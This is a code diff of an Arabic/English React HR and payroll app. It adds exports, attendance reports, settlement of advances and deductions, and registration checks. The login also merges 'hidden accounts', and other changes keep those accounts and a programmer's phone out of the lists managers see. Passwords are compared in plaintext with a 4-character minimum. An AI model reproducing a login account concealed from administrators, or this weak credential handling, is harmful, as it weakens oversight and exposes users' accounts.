+          ? ["الموظف", "النوع", "القيمة", "سبب الطلب", "الحالة", "اعتمد بواسطة"]
+          : ["Employee", "Type", "Amount", "Reason", "Status", "Approved By"]);
+    const rows = source.map((req) => [
+      req.employeeName || "-",
+      req.type || "-",
+      logType === "leave" ? getApprovalLogDetail(req, logType, t) : currency(req.resolvedAmount || req.amount),
+      req.reason || "-",
+      req.status || "-",
+      req.decidedBy || "-",
+    ]);
+    const filePrefix = logType === "leave" ? "attendance-approval-log" : "financial-approval-log";
+    exportRowsToExcel(`${filePrefix}-${new Date().toISOString().slice(0, 10)}.xls`, headers, rows);
+  };
+
+  const exportAccountStatementReport = () => {
+    if (!statementEmployee || !statementData) return;
+    const headers = language === "ar"
+      ? ["التفصيل", "القيمة", "الحالة", "اعتمد بواسطة", "تاريخ الطلب", "الإشعار"]
+      : ["Detail", "Amount", "Status", "Approved By", "Request Date", "Notification"];
+    const summaryRows = language === "ar"
+      ? [
+          ["الموظف", statementEmployee.name || "-", "", "", "", ""],
+          ["المرتب الأساسي", currency(statementData.basicSalary || 0), "", "", "", ""],
+          ["الرصيد الحالي للسلف", currency(statementData.currentAdvanceBalance || 0), "", "", "", ""],
+          ["إجمالي المكافآت المعتمدة", currency(statementData.approvedRewards || 0), "", "", "", ""],
+          ["إجمالي الخصومات المعتمدة", currency(statementData.approvedDeductions || 0), "", "", "", ""],
+          ["الصافي بعد المكافآت والخصومات", currency(statementData.estimatedNet || 0), "", "", "", ""],
+          ["", "", "", "", "", ""],
+        ]
+      : [
+          ["Employee", statementEmployee.name || "-", "", "", "", ""],
+          ["Basic Salary", currency(statementData.basicSalary || 0), "", "", "", ""],
+          ["Current Advance Balance", currency(statementData.currentAdvanceBalance || 0), "", "", "", ""],
+          ["Approved Rewards", currency(statementData.approvedRewards || 0), "", "", "", ""],
+          ["Approved Deductions", currency(statementData.approvedDeductions || 0), "", "", "", ""],
+          ["Net After Rewards & Deductions", currency(statementData.estimatedNet || 0), "", "", "", ""],
+          ["", "", "", "", "", ""],
+        ];
+    const rows = [
+      ...summaryRows,
+      ...statementData.transactions.map((req) => [
+        req.type || "-",
+        currency(req.resolvedAmount || req.amount),
+        getFinancialSettlementStatusLabel(req),
+        req.decidedBy || "-",
+        req.createdAt ? new Date(req.createdAt).toLocaleDateString(language === "ar" ? "ar-EG" : "en-US") : (language === "ar" ? "سجل سابق" : "Previous record"),
+        getNotificationContent(req),
+      ]),
+    ];
+    exportRowsToExcel(`account-statement-${statementEmployee.phone || Date.now()}.xls`, headers, rows);
+  };
+
+  const pushAttendanceReportToSystem = () => {
+    const reportEntry = {
+      id: Date.now(),
+      createdAt: new Date().toISOString(),
+      createdBy: authUser?.name || "-",
+      createdByRole: authUser?.role || "-",
+      date: attendanceDateFilter || "",
+      employeeFilter: attendanceEmployeeFilter || "all",
+      rows: generatedAttendanceRows.map((row) => ({
+        name: row.name,
+        phone: row.phone,
+        department: row.department,
+        scheduledIn: row.scheduledIn,
+        scheduledOut: row.scheduledOut,
+        actualIn: row.actualIn,
+        actualOut: row.actualOut,
+        delayLabel: row.delayLabel,
+        status: row.status,
+        reason: row.reason,
+      })),
+    };
+
+    try {
+      const existingReports = readStorage(STORAGE_KEYS.attendanceReports, [], isArray);
+      const nextReports = [reportEntry, ...existingReports.filter((item) => !isSameNormalizedDate(item?.date, reportEntry.date))].slice(0, 200);
+      if (typeof window !== "undefined") {
+        window.localStorage.setItem(STORAGE_KEYS.attendanceReports, JSON.stringify(nextReports));
+        setAttendanceReportsVersion((prev) => prev + 1);
+        window.alert(language === "ar" ? "تم تنزيل تقرير البصمة إلى السستم بنجاح" : "Attendance report was saved to the system successfully.");
+      }
+    } catch (error) {
+      console.error("Saving attendance report to system failed:", error);
+      if (typeof window !== "undefined") {
+        window.alert(language === "ar" ? "تعذر تنزيل تقرير البصمة إلى السستم" : "Could not save the attendance report to the system.");
+      }
+    }
+  };
 
   const visiblePendingAccounts = useMemo(() => {
     const pending = pendingAccounts.filter((acc) => !acc.addedToEmployees && acc.status !== "مرفوض");
@@ -1684,6 +2955,40 @@ useEffect(() => {
 
 
 
+  const handleComplaintImageSelection = (event) => {
+    const files = Array.from(event.target.files || []).filter((file) => String(file.type || "").startsWith("image/"));
+    if (!files.length) return;
+
+    files.forEach((file) => {
+      const reader = new FileReader();
+      reader.onload = () => {
+        const dataUrl = String(reader.result || "");
+        if (!dataUrl) return;
+        setComplaintForm((prev) => ({
+          ...prev,
+          images: [
+            ...(Array.isArray(prev.images) ? prev.images : []),
+            {
+              id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+              name: file.name || `image-${Date.now()}.jpg`,
+              url: dataUrl,
+            },
+          ],
+        }));
+      };
+      reader.readAsDataURL(file);
+    });
+
+    event.target.value = "";
+  };
+
+  const removeComplaintImage = (imageId) => {
+    setComplaintForm((prev) => ({
+      ...prev,
+      images: (Array.isArray(prev.images) ? prev.images : []).filter((item) => item.id !== imageId),
+    }));
+  };
+
   const submitComplaint = () => {
     if (!authUser || !complaintForm.subject || !complaintForm.body) return;
 
@@ -1703,6 +3008,7 @@ useEffect(() => {
         target: finalTarget,
         subject: complaintForm.subject,
         body: complaintForm.body,
+        images: Array.isArray(complaintForm.images) ? complaintForm.images : [],
         createdAt: new Date().toLocaleDateString("en-CA"),
       },
       ...prev,
@@ -1715,7 +3021,75 @@ useEffect(() => {
     setActiveTab("complaints");
   };
 
+  const visibleFeedbackEntries = useMemo(() => {
+    if (!authUser) return [];
+    if (isProgrammerUser) {
+      return [...feedbackEntries].sort((a, b) => new Date(b.createdAt || 0).getTime() - new Date(a.createdAt || 0).getTime());
+    }
+    return feedbackEntries.filter((item) => item.senderPhone === authUser.phone).sort((a, b) => new Date(b.createdAt || 0).getTime() - new Date(a.createdAt || 0).getTime());
+  }, [feedbackEntries, authUser, isProgrammerUser]);
 
+  const submitFeedback = async () => {
+    if (!authUser) return;
+    if (!Number(feedbackForm.rating)) {
+      setFeedbackMessage(language === "ar" ? "اختر تقييمًا من 1 إلى 5 نجوم" : "Choose a rating from 1 to 5 stars.");
+      return;
+    }
+    if (!String(feedbackForm.message || "").trim()) {
+      setFeedbackMessage(language === "ar" ? "اكتب رأيك قبل الإرسال" : "Write your feedback before sending.");
+      return;
+    }
+
+    const newEntry = {
+      id: Date.now(),
+      senderName: authUser.name || authUser.phone || "-",
+      senderPhone: authUser.phone || "-",
+      rating: Number(feedbackForm.rating || 0),
+      message: String(feedbackForm.message || "").trim(),
+      targetPhone: PROGRAMMER_ACCOUNT_PHONE,
+      createdAt: new Date().toISOString(),
+      status: "sent",
+    };
+    const nextFeedback = [newEntry, ...feedbackEntries];
+    setFeedbackEntries(nextFeedback);
+    setFeedbackForm({ rating: 0, message: "" });
+    setFeedbackMessage(language === "ar" ? "تم إرسال التقييم إلى مبرمجR1" : "Your feedback was sent to Programmer R1.");
+    await forceRemoteSaveSnapshot({
+      employees,
+      requests,
+      users: systemUsers,
+      pending: pendingAccounts,
+      upgrades: upgradeRequests,
+      complaints,
+      chats,
+      chatCalls,
+      feedback: nextFeedback,
+    });
+    window.setTimeout(() => {
+      setFeedbackWidgetOpen(false);
+      setFeedbackMessage("");
+    }, 900);
+  };
+
+
+
+  const REQUEST_LOG_HIDE_AFTER_HOURS = 29;
+
+  const getRequestDecisionTime = (req) => {
+    if (!["معتمد", "مرفوض"].includes(String(req?.status || ""))) return null;
+    const raw = req?.decidedAt || req?.updatedAt || req?.createdAt || "";
+    const parsed = raw ? new Date(raw).getTime() : NaN;
+    return Number.isFinite(parsed) ? parsed : null;
+  };
+
+  const shouldKeepRequestVisible = (req) => {
+    if (!req) return false;
+    if (String(req.status || "") === "بانتظار الاعتماد" || req.canDecide) return true;
+    if (!["معتمد", "مرفوض"].includes(String(req.status || ""))) return true;
+    const decidedAt = getRequestDecisionTime(req);
+    if (!decidedAt) return false;
+    return Date.now() - decidedAt < REQUEST_LOG_HIDE_AFTER_HOURS * 60 * 60 * 1000;
+  };
 
   const visibleLeaveRequests = useMemo(() => {
     const list = requests.filter((req) => req.type === "إجازة" || req.type === "تأخير");
@@ -1734,6 +3108,16 @@ useEffect(() => {
     return list.filter((req) => req.employeePhone === authUser.phone);
   }, [requests, authUser, canManageAll, canManageBranch, canManageDepartment]);
 
+  const activeLeaveRequests = useMemo(
+    () => visibleLeaveRequests.filter((req) => shouldKeepRequestVisible(req)),
+    [visibleLeaveRequests]
+  );
+
+  const activeFinancialRequests = useMemo(
+    () => visibleFinancialRequests.filter((req) => shouldKeepRequestVisible(req)),
+    [visibleFinancialRequests]
+  );
+
   const approvalLeaveRequests = useMemo(() => {
     if (!(canManageAll || canManageBranch || canManageDepartment)) return [];
     return visibleLeaveRequests.filter((req) => ["إجازة", "تأخير"].includes(req.type) && req.canDecide);
@@ -1745,10 +3129,10 @@ useEffect(() => {
   }, [visibleFinancialRequests, canManageAll, canManageBranch, canManageDepartment]);
 
   const requestHubHasApprovalActions = canManageAll || canManageBranch || canManageDepartment;
-  const requestHubLeaveRequests = requestHubHasApprovalActions ? approvalLeaveRequests : visibleLeaveRequests;
+  const requestHubLeaveRequests = requestHubHasApprovalActions ? approvalLeaveRequests : activeLeaveRequests;
   const requestHubFinancialRequests = requestHubHasApprovalActions
     ? approvalFinancialRequests
-    : visibleFinancialRequests.filter((req) => ["سلفة", "مكافأة", "خصم"].includes(req.type));
+    : activeFinancialRequests.filter((req) => ["سلفة", "مكافأة", "خصم"].includes(req.type));
   const approvalLogLeaveRequests = useMemo(
     () =>
       visibleLeaveRequests.filter((req) =>
@@ -1767,8 +3151,9 @@ useEffect(() => {
 
   const visibleUpgradeRequests = useMemo(() => {
     if (!authUser) return [];
-    if (canManageAll) return upgradeRequests;
-    return upgradeRequests.filter((req) => req.employeePhone === authUser.phone);
+    const list = upgradeRequests.filter((req) => req.employeePhone !== PROGRAMMER_ACCOUNT_PHONE);
+    if (canManageAll) return list;
+    return list.filter((req) => req.employeePhone === authUser.phone);
   }, [upgradeRequests, authUser, canManageAll]);
 
   const pendingAccountCount = useMemo(
@@ -1839,17 +3224,17 @@ useEffect(() => {
 
     if (canManageAll) {
       systemUsers.forEach((user) => {
-        if (user.phone !== authUser.phone) allowedPhones.add(user.phone);
+        if (user.phone !== authUser.phone && (!isHiddenAccount(user) || isProgrammerUser)) allowedPhones.add(user.phone);
       });
     } else if (canManageBranch) {
       systemUsers.forEach((user) => {
-        if (user.phone !== authUser.phone && (user.managedBranch === authUser.managedBranch || ["owner", "hr"].includes(user.role))) {
+        if (user.phone !== authUser.phone && (!isHiddenAccount(user) || isProgrammerUser) && (user.managedBranch === authUser.managedBranch || ["owner", "hr"].includes(user.role))) {
           allowedPhones.add(user.phone);
         }
       });
     } else if (canManageDepartment) {
       systemUsers.forEach((user) => {
-        if (user.phone !== authUser.phone && (user.managedDepartment === authUser.managedDepartment || ["owner", "hr"].includes(user.role))) {
+        if (user.phone !== authUser.phone && (!isHiddenAccount(user) || isProgrammerUser) && (user.managedDepartment === authUser.managedDepartment || ["owner", "hr"].includes(user.role))) {
           allowedPhones.add(user.phone);
         }
       });
@@ -1857,6 +3242,7 @@ useEffect(() => {
       systemUsers.forEach((user) => {
         if (
           user.phone !== authUser.phone &&
+          (!isHiddenAccount(user) || isProgrammerUser) &&
           (
             ["owner", "hr"].includes(user.role) ||
             user.managedDepartment === authUser.managedDepartment ||
@@ -1952,7 +3338,7 @@ useEffect(() => {
         const bTime = b.lastMessage?.sentAt ? new Date(b.lastMessage.sentAt).getTime() : 0;
         return bTime - aTime;
       });
-  }, [authUser, systemUsers, employees, chats, language, canManageAll, canManageBranch, canManageDepartment, chatSearch, chatFilter]);
+  }, [authUser, systemUsers, employees, chats, language, canManageAll, canManageBranch, canManageDepartment, chatSearch, chatFilter, isProgrammerUser]);
 
   useEffect(() => {
     if (!isMobileView || !activeChatId) return;
@@ -2297,6 +3683,10 @@ useEffect(() => {
     }
     const payloads = {
       file: { type: "file", text: language === "ar" ? "تمت مشاركة ملف" : "File shared", fileName: "document.pdf" },
+      poll: {
+        type: "text",
+        text: language === "ar" ? "تم إنشاء استطلاع رأي جديد" : "New poll created",
+      },
     };
     upsertConversationWithMessage(activeConversation, createChatMessage(payloads[kind] || payloads.file));
   };
@@ -2657,40 +4047,136 @@ useEffect(() => {
     setStatementDialogOpen(true);
   };
 
+  const getRequestResolvedAmount = (req, baseSalary = 0) => {
+    if (!req) return 0;
+    if (req.type === "خصم" && req.valueType === "percentage") {
+      const percent = Number(req.percentage || req.amount || 0);
+      return Math.max(0, (Number(baseSalary || 0) * percent) / 100);
+    }
+    return Math.max(0, Number(req.amount || 0));
+  };
+
+
+  const getAdvanceDeductionDetails = (employee, salaryBase = 0) => {
+    if (!employee) return { mode: "automatic", valueType: "amount", configuredValue: 0, cappedValue: 0, maxAllowedValue: 0, amount: 0 };
+    const mode = employee.advanceDeductionMode || "automatic";
+    const valueType = employee.advanceDeductionValueType || "amount";
+    const configuredValue = Math.max(0, Number(employee.advanceDeductionValue || 0));
+    const currentAdvance = Math.max(0, Number(employee.advance || 0));
+    const salary = Math.max(0, Number(salaryBase || employee.salary || employee.basicSalary || 0));
+    const maxAllowedValue = valueType === "percentage"
+      ? (salary > 0 ? (currentAdvance / salary) * 100 : 0)
+      : currentAdvance;
+    const cappedValue = Math.max(0, Math.min(configuredValue, maxAllowedValue));
+    const calculatedAmount = valueType === "percentage"
+      ? (salary * cappedValue) / 100
+      : cappedValue;
+
+    return {
+      mode,
+      valueType,
+      configuredValue,
+      cappedValue,
+      maxAllowedValue,
+      amount: Math.max(0, Math.min(currentAdvance, calculatedAmount)),
+    };
+  };
+
+  const getAdvanceDeductionLabel = (employee, salaryBase = 0) => {
+    const details = getAdvanceDeductionDetails(employee, salaryBase);
+    const modeLabel = details.mode === "manual" ? (language === "ar" ? "يدوي" : "Manual") : (language === "ar" ? "تلقائي" : "Automatic");
+    if (!details.cappedValue) return `${modeLabel} • ${language === "ar" ? "غير مضبوط" : "Not set"}`;
+    const valueLabel = details.valueType === "percentage"
+      ? `${Number(details.cappedValue).toFixed(2).replace(/\.00$/, "")} % ${language === "ar" ? "من الراتب" : "of salary"}`
+      : currency(details.cappedValue);
+    return `${modeLabel} • ${valueLabel}`;
+  };
+
+  const openAdvanceSettlementDialog = (employee) => {
+    if (!employee) return;
+    const nextEmployee = employees.find((emp) => emp.phone === employee.phone) || employee;
+    setStatementEmployee(nextEmployee);
+    setAdvanceSettlementForm({
+      deductionMode: nextEmployee.advanceDeductionMode || "automatic",
+      valueType: nextEmployee.advanceDeductionValueType || "amount",
+      value: String(nextEmployee.advanceDeductionValue || ""),
+    });
+    setAdvanceSettlementDialogOpen(true);
+  };
+
+  const saveAdvanceSettlementSettings = () => {
+    if (!statementEmployee) return;
+    const previewEmployee = {
+      ...statementEmployee,
+      advanceDeductionMode: advanceSettlementForm.deductionMode || "automatic",
+      advanceDeductionValueType: advanceSettlementForm.valueType || "amount",
+      advanceDeductionValue: Math.max(0, Number(advanceSettlementForm.value || 0)),
+    };
+    const details = getAdvanceDeductionDetails(previewEmployee, statementData?.grossSalary || statementEmployee.salary || statementEmployee.basicSalary || 0);
+    const nextValue = details.cappedValue;
+    setEmployees((current) => current.map((emp) =>
+      emp.phone === statementEmployee.phone
+        ? {
+            ...emp,
+            advanceDeductionMode: advanceSettlementForm.deductionMode || "automatic",
+            advanceDeductionValueType: advanceSettlementForm.valueType || "amount",
+            advanceDeductionValue: nextValue,
+          }
+        : emp
+    ));
+    setStatementEmployee((prev) => prev ? {
+      ...prev,
+      advanceDeductionMode: advanceSettlementForm.deductionMode || "automatic",
+      advanceDeductionValueType: advanceSettlementForm.valueType || "amount",
+      advanceDeductionValue: nextValue,
+    } : prev);
+    setAdvanceSettlementForm((prev) => ({ ...prev, value: String(nextValue) }));
+    setAdvanceSettlementDialogOpen(false);
+  };
+
   const getEmployeeFinancialStatement = (employee) => {
     if (!employee) return null;
     const employeeRequests = requests
       .filter((req) => req.employeePhone === employee.phone && ["سلفة", "مكافأة", "خصم", "إنزال مرتب"].includes(req.type))
       .sort((a, b) => Number(b.id || 0) - Number(a.id || 0));
 
+    const basicSalary = Number(employee.basicSalary || employee.salary || 0);
+    const latestSalaryDeposit = employeeRequests.find((req) => req.type === "إنزال مرتب" && req.status === "معتمد") || null;
+    const grossSalary = Number(latestSalaryDeposit?.salaryAmount || employee.salary || employee.basicSalary || 0);
+
     const approvedAdvances = employeeRequests
       .filter((req) => req.type === "سلفة" && req.status === "معتمد")
       .reduce((sum, req) => sum + Number(req.amount || 0), 0);
 
     const approvedRewards = employeeRequests
-      .filter((req) => req.type === "مكافأة" && req.status === "معتمد")
-      .reduce((sum, req) => sum + Number(req.amount || 0), 0);
+      .filter((req) => req.type === "مكافأة" && req.status === "معتمد" && !req.appliedToSalaryDepositId)
+      .reduce((sum, req) => sum + getRequestResolvedAmount(req, grossSalary), 0);
 
     const approvedDeductions = employeeRequests
-      .filter((req) => req.type === "خصم" && req.status === "معتمد")
-      .reduce((sum, req) => sum + Number(req.amount || 0), 0);
+      .filter((req) => req.type === "خصم" && req.status === "معتمد" && !req.appliedToSalaryDepositId)
+      .reduce((sum, req) => sum + getRequestResolvedAmount(req, grossSalary), 0);
 
     const currentAdvanceBalance = Number(employee.advance || 0);
-    const grossSalary = Number(employee.salary || employee.basicSalary || 0);
-    const basicSalary = Number(employee.basicSalary || employee.salary || 0);
-    const baseNet = grossSalary - currentAdvanceBalance;
-    const estimatedNet = baseNet + approvedRewards - approvedDeductions;
+    const advanceDeduction = getAdvanceDeductionDetails(employee, grossSalary);
+    const latestNetAmount = latestSalaryDeposit ? Math.max(0, Number(latestSalaryDeposit.amount || 0)) : null;
+    const baseNet = latestNetAmount !== null ? latestNetAmount : Math.max(0, grossSalary - advanceDeduction.amount);
+    const estimatedNet = Math.max(0, baseNet + approvedRewards - approvedDeductions);
 
     return {
       basicSalary,
       grossSalary,
       currentAdvanceBalance,
+      advanceDeduction,
       approvedAdvances,
       approvedRewards,
       approvedDeductions,
       baseNet,
       estimatedNet,
-      transactions: employeeRequests,
+      latestSalaryDeposit,
+      transactions: employeeRequests.map((req) => ({
+        ...req,
+        resolvedAmount: getRequestResolvedAmount(req, grossSalary),
+      })),
     };
   };
 
@@ -2709,18 +4195,77 @@ useEffect(() => {
       if (requestItem.month) {
         parts.push(`${t.month}: ${requestItem.month}`);
       }
-      parts.push(
-        `${t.salaryAmount}: ${currency(requestItem.salaryAmount || 0)}`
-      );
+      parts.push(`${t.salaryAmount}: ${currency(requestItem.salaryAmount || 0)}`);
+      if (Number(requestItem.rewardAmount || 0)) {
+        parts.push(`${language === "ar" ? "المكافآت المعتمدة" : "Approved rewards"}: ${currency(requestItem.rewardAmount || 0)}`);
+      }
       if (Number(requestItem.deductionAmount || 0)) {
         parts.push(`${t.deductionAmount}: ${currency(requestItem.deductionAmount || 0)}`);
+      }
+      if (Number(requestItem.advanceSettledAmount || 0)) {
+        parts.push(`${language === "ar" ? "المخصوم من السلفة" : "Advance settlement"}: ${currency(requestItem.advanceSettledAmount || 0)}`);
+      }
+      if (Number(requestItem.amount || 0) || Number(requestItem.amount || 0) === 0) {
+        parts.push(`${t.net}: ${currency(requestItem.amount || 0)}`);
       }
       if (requestItem.reason && requestItem.reason !== "-") {
         parts.push(`${t.deductionReason}: ${requestItem.reason}`);
       }
       return parts.join(" | ");
     }
+    if (requestItem.type === "خصم" || requestItem.type === "مكافأة") {
+      const parts = [];
+      const actionLabel = requestItem.type === "خصم"
+        ? (language === "ar" ? "الخصم" : "Deduction")
+        : (language === "ar" ? "المكافأة" : "Reward");
+      parts.push(`${actionLabel}: ${currency(requestItem.resolvedAmount || requestItem.amount || 0)}`);
+      parts.push(`${language === "ar" ? "حالة التنفيذ" : "Execution status"}: ${getFinancialSettlementStatusLabel(requestItem)}`);
+      if (requestItem.type === "خصم") {
+        parts.push(`${language === "ar" ? "نوع الخصم" : "Deduction mode"}: ${requestItem.deductionMode === "automatic" ? (language === "ar" ? "تلقائي" : "Automatic") : (language === "ar" ? "يدوي" : "Manual")}`);
+        if (requestItem.valueType === "percentage") {
+          parts.push(`${language === "ar" ? "النسبة" : "Percentage"}: ${Number(requestItem.percentage || requestItem.amount || 0)}%`);
+        }
+      }
+      const linkedSalary = getLinkedSalaryDeposit(requestItem);
+      if (linkedSalary) {
+        const salaryLabel = linkedSalary.month
+          ? `${language === "ar" ? "مرتب شهر" : "Salary for month"} ${linkedSalary.month}`
+          : (language === "ar" ? "إنزال المرتب" : "Salary deposit");
+        parts.push(`${language === "ar" ? "تمت التسوية مع" : "Settled with"}: ${salaryLabel}`);
+        parts.push(`${language === "ar" ? "صافي ذلك المرتب" : "Net salary on that deposit"}: ${currency(linkedSalary.amount || 0)}`);
+      }
+      if (requestItem.reason && requestItem.reason !== "-") {
+        parts.push(`${t.reason}: ${requestItem.reason}`);
+      }
+      return parts.join(" | ");
+    }
     return requestItem.reason && requestItem.reason !== "-" ? requestItem.reason : t.noReasonAvailable;
+  };
+
+  const getLinkedSalaryDeposit = (requestItem) => {
+    if (!requestItem?.appliedToSalaryDepositId) return null;
+    return requests.find((req) => req.type === "إنزال مرتب" && req.id === requestItem.appliedToSalaryDepositId) || null;
+  };
+
+  const getFinancialSettlementStatusLabel = (requestItem) => {
+    if (!requestItem) return "-";
+    if (requestItem.type === "إنزال مرتب") return requestItem.status || "-";
+    if (!["خصم", "مكافأة"].includes(requestItem.type)) return requestItem.status || "-";
+
+    if (requestItem.status === "مرفوض") {
+      return language === "ar" ? "مرفوض" : "Rejected";
+    }
+    if (requestItem.status !== "معتمد") {
+      return requestItem.status || "-";
+    }
+
+    if (requestItem.appliedToSalaryDepositId) {
+      return requestItem.type === "خصم"
+        ? (language === "ar" ? "تم الخصم" : "Deducted")
+        : (language === "ar" ? "تمت الإضافة" : "Added to salary");
+    }
+
+    return language === "ar" ? "معلق - لم يخصم بعد" : "Pending - not settled yet";
   };
 
 
@@ -2815,6 +4360,7 @@ useEffect(() => {
 
     const employee = employees.find((emp) => emp.phone === upgradeRequestForm.employeePhone.trim());
     const currentUser = systemUsers.find((user) => user.phone === upgradeRequestForm.employeePhone.trim());
+    if (isHiddenAccount(currentUser)) return;
     const requestedRole = upgradeRequestForm.requestedRole;
     const selectedDepartment = requestedRole === "department_manager"
       ? (
@@ -2875,13 +4421,18 @@ useEffect(() => {
   };
 
   const handleLogin = () => {
-    const matchedUser = systemUsers.find((user) => user.phone === loginData.phone && user.password === loginData.password);
+    const normalizedPhone = String(loginData.phone || "").trim();
+    const normalizedPassword = String(loginData.password || "").trim();
+    const matchedUser = mergeSystemUsersWithHiddenAccounts(systemUsers).find(
+      (user) => String(user.phone || "").trim() === normalizedPhone && String(user.password || "") === normalizedPassword
+    );
     if (!matchedUser) {
       setLoginError(language === "ar" ? "رقم الهاتف أو كلمة المرور غير صحيحة" : "Phone number or password is incorrect.");
       return;
     }
     setIsAuthenticated(true);
     setAuthUser(matchedUser);
+    setSystemUsers((prev) => mergeSystemUsersWithHiddenAccounts(prev));
     setLoginError("");
     if (matchedUser.mustChangePassword && !matchedUser.passwordChangedOnce) {
       setTimeout(() => openPasswordDialog(), 150);
@@ -2934,20 +4485,60 @@ useEffect(() => {
   };
 
   const submitRegisterRequest = () => {
-    if (!registerForm.name || !registerForm.phone || !registerForm.password) {
-      setRegisterMessage(language === "ar" ? "املأ الاسم ورقم الهاتف وكلمة المرور" : "Fill in name, phone and password.");
+    const normalizedName = String(registerForm.name || "").trim().replace(/\s+/g, " ");
+    const normalizedPhone = String(registerForm.phone || "").trim();
+    const normalizedPassword = String(registerForm.password || "");
+    const normalizedDepartment = String(registerForm.department || "").trim();
+    const normalizedEmail = String(registerForm.email || "").trim();
+    const normalizedLocation = String(registerForm.location || "").trim();
+
+    if (!normalizedName || !normalizedPhone || !normalizedPassword || !normalizedLocation) {
+      setRegisterMessage(language === "ar" ? "املأ الاسم ورقم الهاتف وكلمة المرور والفرع" : "Fill in name, phone, password and branch.");
       return;
     }
-    const existsUser = systemUsers.some((user) => user.phone === registerForm.phone);
-    const existsPending = pendingAccounts.some((acc) => acc.phone === registerForm.phone && acc.status === "بانتظار الاعتماد");
+
+    const nameParts = normalizedName.split(" ").filter(Boolean);
+    if (nameParts.length < 3) {
+      setRegisterMessage(language === "ar" ? "الاسم يجب أن يكون ثلاثيًا على الأقل" : "Name must be at least three parts.");
+      return;
+    }
+
+    if (!/^09[1-4]\d{7}$/.test(normalizedPhone)) {
+      setRegisterMessage(
+        language === "ar"
+          ? "رقم الهاتف يجب أن يبدأ بـ 091 أو 092 أو 093 أو 094 ثم 7 أرقام فقط"
+          : "Phone must start with 091, 092, 093 or 094 then 7 digits."
+      );
+      return;
+    }
+
+    if (normalizedPassword.length < 4) {
+      setRegisterMessage(language === "ar" ? "كلمة المرور يجب ألا تقل عن 4 خانات أو أحرف أو رموز" : "Password must be at least 4 characters.");
+      return;
+    }
+
+    if (normalizedEmail && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(normalizedEmail)) {
+      setRegisterMessage(language === "ar" ? "البريد الإلكتروني غير صحيح" : "Email address is invalid.");
+      return;
+    }
+
+    const existsUser = systemUsers.some((user) => String(user.phone || "").trim() === normalizedPhone);
+    const existsPending = pendingAccounts.some((acc) => String(acc.phone || "").trim() === normalizedPhone && acc.status === "بانتظار الاعتماد");
     if (existsUser || existsPending) {
       setRegisterMessage(language === "ar" ? "رقم الهاتف مستخدم بالفعل أو لديه طلب مفتوح" : "Phone number is already used or has an open request.");
       return;
     }
+
     setPendingAccounts((prev) => [
       {
         id: Date.now(),
         ...registerForm,
+        name: normalizedName,
+        phone: normalizedPhone,
+        password: normalizedPassword,
+        department: normalizedDepartment,
+        email: normalizedEmail,
+        location: normalizedLocation,
         status: "بانتظار الاعتماد",
         approvedBy: "",
         addedToEmployees: false,
@@ -2980,6 +4571,12 @@ useEffect(() => {
       shift: form.shift || "morning",
       fromHour: form.fromHour || "",
       toHour: form.toHour || "",
+      attendanceLateDeductionMode: form.attendanceLateDeductionMode || "automatic",
+      attendanceLateValueType: form.attendanceLateValueType || "amount",
+      attendanceLateValue: Number(form.attendanceLateValue || 0),
+      attendanceAbsenceDeductionMode: form.attendanceAbsenceDeductionMode || "automatic",
+      attendanceAbsenceValueType: form.attendanceAbsenceValueType || "amount",
+      attendanceAbsenceValue: Number(form.attendanceAbsenceValue || 0),
     };
 
     setEmployees((prev) => [employee, ...prev]);
@@ -3052,6 +4649,12 @@ useEffect(() => {
       fromHour: account.fromHour || "",
       toHour: account.toHour || "",
       description: account.description || "",
+      attendanceLateDeductionMode: account.attendanceLateDeductionMode || "automatic",
+      attendanceLateValueType: account.attendanceLateValueType || "amount",
+      attendanceLateValue: String(account.attendanceLateValue || ""),
+      attendanceAbsenceDeductionMode: account.attendanceAbsenceDeductionMode || "automatic",
+      attendanceAbsenceValueType: account.attendanceAbsenceValueType || "amount",
+      attendanceAbsenceValue: String(account.attendanceAbsenceValue || ""),
     });
     setCompleteDialogOpen(true);
   };
@@ -3075,6 +4678,12 @@ useEffect(() => {
       shift: completeForm.shift || "morning",
       fromHour: completeForm.fromHour || "",
       toHour: completeForm.toHour || "",
+      attendanceLateDeductionMode: completeForm.attendanceLateDeductionMode || "automatic",
+      attendanceLateValueType: completeForm.attendanceLateValueType || "amount",
+      attendanceLateValue: Number(completeForm.attendanceLateValue || 0),
+      attendanceAbsenceDeductionMode: completeForm.attendanceAbsenceDeductionMode || "automatic",
+      attendanceAbsenceValueType: completeForm.attendanceAbsenceValueType || "amount",
+      attendanceAbsenceValue: Number(completeForm.attendanceAbsenceValue || 0),
     };
 
     setEmployees((prev) => {
@@ -3133,6 +4742,12 @@ useEffect(() => {
       shift: employee.shift || "morning",
       fromHour: employee.fromHour || "",
       toHour: employee.toHour || "",
+      attendanceLateDeductionMode: employee.attendanceLateDeductionMode || "automatic",
+      attendanceLateValueType: employee.attendanceLateValueType || "amount",
+      attendanceLateValue: String(employee.attendanceLateValue || ""),
+      attendanceAbsenceDeductionMode: employee.attendanceAbsenceDeductionMode || "automatic",
+      attendanceAbsenceValueType: employee.attendanceAbsenceValueType || "amount",
+      attendanceAbsenceValue: String(employee.attendanceAbsenceValue || ""),
     });
     setEditDialogOpen(true);
   };
@@ -3161,6 +4776,12 @@ useEffect(() => {
               shift: editForm.shift || "morning",
               fromHour: editForm.fromHour || "",
               toHour: editForm.toHour || "",
+              attendanceLateDeductionMode: editForm.attendanceLateDeductionMode || "automatic",
+              attendanceLateValueType: editForm.attendanceLateValueType || "amount",
+              attendanceLateValue: Number(editForm.attendanceLateValue || 0),
+              attendanceAbsenceDeductionMode: editForm.attendanceAbsenceDeductionMode || "automatic",
+              attendanceAbsenceValueType: editForm.attendanceAbsenceValueType || "amount",
+              attendanceAbsenceValue: Number(editForm.attendanceAbsenceValue || 0),
             }
           : emp
       )
@@ -3208,17 +4829,171 @@ useEffect(() => {
     reader.readAsDataURL(file);
   };
 
+  const normalizeLeaveDateValue = (value) => {
+    const raw = String(value || "").trim();
+    if (!raw) return "";
+
+    const isoMatch = raw.match(/(19|20)\d{2}-\d{2}-\d{2}/);
+    if (isoMatch) return isoMatch[0];
+
+    const cleaned = raw.replace(/[.\\]/g, "/").replace(/-/g, "/").replace(/\s+/g, "");
+    const dmyMatch = cleaned.match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})$/);
+    if (dmyMatch) {
+      const day = Number(dmyMatch[1]);
+      const month = Number(dmyMatch[2]);
+      const year = Number(dmyMatch[3]);
+      if (year >= 1900 && year <= 2100 && month >= 1 && month <= 12 && day >= 1 && day <= 31) {
